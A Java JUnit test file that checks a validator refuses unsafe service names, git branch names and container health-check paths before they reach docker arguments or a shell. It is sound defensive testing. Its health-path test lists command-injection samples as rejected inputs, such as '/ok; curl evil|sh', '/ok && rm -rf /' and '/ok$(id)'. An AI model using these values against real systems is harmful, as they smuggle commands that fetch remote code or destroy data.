package eu.wohlben.qits.platformdeployments.environments.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import eu.wohlben.qits.platformdeployments.environments.error.BadRequestException;
import org.junit.jupiter.api.Test;

/**
 * The validation vocabulary of everything the topology stores. These are the strings that become
 * docker network names, network aliases, image references and a container's own {@code
 * --health-cmd} shell string once the execution domain reads them back — so the point of each case
 * is that this component refuses at the boundary that accepts a value what it would have to refuse
 * at the argv that uses it.
 *
 * <p>Both ancestors carried this suite; one file now, because there is one definition.
 */
class PdIdentifiersTest {

  @Test
  void aDnsLabelNameIsAccepted() {
    assertEquals(
        "qits-platform-deployments",
        PdIdentifiers.requireName("qits-platform-deployments", "service name"));
    assertEquals("dev", PdIdentifiers.requireName("dev", "environment name"));
    assertEquals("a1", PdIdentifiers.requireName("a1", "service name"));
    assertEquals("a", PdIdentifiers.requireName("a", "environment name"));
  }

  @Test
  void anythingOutsideTheHostnameLabelCharsetIsRefused() {
    // Uppercase, underscores, dots and spaces are all out: a name that reaches a hostname label one
    // day must be usable as one from the start. The shell metacharacters are the other half.
    for (String name : new String[] {null, "", " ", "Dev", "qits_cd", "qits.cd", "qits cd", "sh;rm"}) {
      assertThrows(
          BadRequestException.class,
          () -> PdIdentifiers.requireName(name, "service name"),
          String.valueOf(name));
    }
  }

  @Test
  void aNameMayNotStartOrEndWithADash() {
    assertThrows(
        BadRequestException.class, () -> PdIdentifiers.requireName("-dev", "environment name"));
    assertThrows(
        BadRequestException.class, () -> PdIdentifiers.requireName("dev-", "environment name"));
  }

  @Test
  void aNameIsBoundedAtSixtyThreeCharacters() {
    assertEquals(63, PdIdentifiers.requireName("a".repeat(63), "service name").length());
    assertThrows(
        BadRequestException.class, () -> PdIdentifiers.requireName("a".repeat(64), "service name"));
  }

  @Test
  void aRealBranchIsAccepted() {
    assertEquals("main", PdIdentifiers.requireBranch("main"));
    assertEquals("environment/dev", PdIdentifiers.requireBranch("environment/dev"));
    assertEquals("release/1.2.3", PdIdentifiers.requireBranch("release/1.2.3"));
  }

  @Test
  void theRefNameTrapsAreRefused() {
    // git's own reserved shapes, plus the traversal a path-joining reader would follow.
    for (String branch :
        new String[] {null, "", "a..b", "a//b", "trailing/", "main.lock", "-dash", "with space"}) {
      assertThrows(
          BadRequestException.class,
          () -> PdIdentifiers.requireBranch(branch),
          String.valueOf(branch));
    }
  }

  @Test
  void anAbsoluteMetacharacterFreePathIsAcceptedAsAHealthPath() {
    assertEquals(
        "/platform-deployments/q/health/ready",
        PdIdentifiers.requireHealthPath("/platform-deployments/q/health/ready"));
    assertEquals("/q/health/ready", PdIdentifiers.requireHealthPath("/q/health/ready"));
    assertEquals("/healthz", PdIdentifiers.requireHealthPath("/healthz"));
  }

  @Test
  void aHealthPathCarryingShellPunctuationIsRefused() {
    // This value is interpolated into a string a container's shell runs, so the allowlist is the
    // guard and there are no exceptions to it.
    for (String path :
        new String[] {
          null, "", "healthz", "/ok; curl evil|sh", "/ok && rm -rf /", "/ok$(id)", "/ok`id`",
          "/ok health", "/ok\"", "/ok'", "/q&whoami"
        }) {
      assertThrows(
          BadRequestException.class,
          () -> PdIdentifiers.requireHealthPath(path),
          String.valueOf(path));
    }
  }

  @Test
  void anApplicationKeyIsJoinableFromBothSides() {
    // The client joins the applications listing against a deployment's applicationId, and neither
    // side has a row to take an id from — so both derive it from (tier, name) through this one
    // definition. `platform` is where an environment id would be, and no environment can take that
    // place: the name is not a dns label, so PdIdentifiers refuses it.
    assertEquals("env-1:qits-workspaces", ApplicationKeys.of("env-1", "qits-workspaces"));
    assertEquals("platform:qits-idp", ApplicationKeys.of(null, "qits-idp"));
  }
}
